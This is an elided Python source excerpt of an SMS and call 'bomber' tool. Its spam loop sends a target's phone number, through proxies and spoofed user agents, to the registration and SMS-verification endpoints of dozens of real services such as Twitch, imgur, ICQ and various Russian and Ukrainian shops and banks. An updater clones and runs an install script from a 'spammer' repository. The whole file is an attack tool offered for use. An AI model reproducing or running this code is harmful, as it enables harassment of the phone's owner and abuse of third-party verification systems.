...
def bomber():
    ...
    def start_spam(phone, proxies):
        ...
        while True:
            try:
                ...
                post("https://zoloto585.ru/api/bcard/reg/",
                     json={"name": "", "surname": "", "patronymic": "", "sex": "m", "birthdate": "..",
                           "phone": formatted_phone, "email": "", "city": ""}, headers=headers, proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                post("https://passport.twitch.tv/register?trusted_request=true",
                     json={"birthday": {"day": 11, "month": 11, "year": 1999},
                           ...
                           "password": password, "phone_number": phone, "username": name}, headers=headers,
                     proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                ...
                pass
            try:
                post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": phone},
                     headers=headers, proxies=proxies)
            except:
                pass
            try:
                ...
                post("https://api.pozichka.ua/v1/registration/send",
                     json={"RegisterSendForm": {"phone": formatted_phone}}, headers=headers, proxies=proxies)
            except:
                pass
            try:
                formatted_phone = format_phone(phone, "+# (###) ###-##-##")
            ...
            try:
                ...
                pass
            try:
                post("https://ontaxi.com.ua/api/v2/web/client", json={"country": "UA", "phone": phone[3:]},
                     headers=headers, proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                post("https://www.moyo.ua/identity/registration",
                     data={"firstname": name, "phone": phone, "email": email}, headers=headers, proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
                     json={"FirstName": name, "CellPhone": phone, "Package": "optimal"}, headers=headers,
                     proxies=proxies)
            except:
                pass
            try:
                ...
                pass
            try:
                get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+" + phone},
                    headers=headers, proxies=proxies)
            except:
                pass
            try:
                get("https://menza-cafe.ru/system/call_me.php",
                    params={"fio": name, "phone": phone, "phone_number": "1"}, headers=headers, proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                post("https://api.kinoland.com.ua/api/v1/service/send-sms",
                     headers={"Agent": "website", "User-Agent": generate_user_agent()},
                     json={"Phone": phone, "Type": 1}, proxies=proxies)
            except:
                pass
            try:
                formatted_phone = format_phone(phone, "# (###) ###-##-##")
            ...
            try:
                post("https://izi.ua/api/auth/register",
                     json={"phone": "+" + phone, "name": name, "is_terms_accepted": True}, headers=headers,
                     proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                post("https://api.imgur.com/account/v1/phones/verify",
                     json={"phone_number": phone, "region_code": "RU"}, headers=headers, proxies=proxies)
            except:
                pass
            try:
                post("https://www.icq.com/smsreg/requestPhoneValidation.php",
                     data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1",
                           "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers, proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                post("https://api.delitime.ru/api/v2/signup",
                     data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers=headers,
                     proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                ...
                pass
            try:
                post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": phone},
                     headers=headers, proxies=proxies)
            except:
                pass
            try:
            ...
            try:
                ...
                pass
            try:
                post("https://api.carsmile.com/", son={"operationName": "enterPhone", "variables": {"phone": phone},
            ...
            try:
                ...
                post("https://apteka.ru/_action/auth/getForm/",
                     data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                           "form[EMAIL]": "", "form[LOGIN]": formatted_phone, "form[PASSWORD]": password,
    ...
    def update():
        ...
        if update.lower() == "y":
            ...
            elif exists("/data/data/com.termux/files/usr/bin") and isfile(
                    "/data/data/com.termux/files/usr/bin/spammer"):
            ...
            try:
                ...
                system(
                    "cd $HOME && rm -rf spammer && git clone https://github.com/cludeex/spammer && cd spammer && sh install.sh")
        else:
            main()
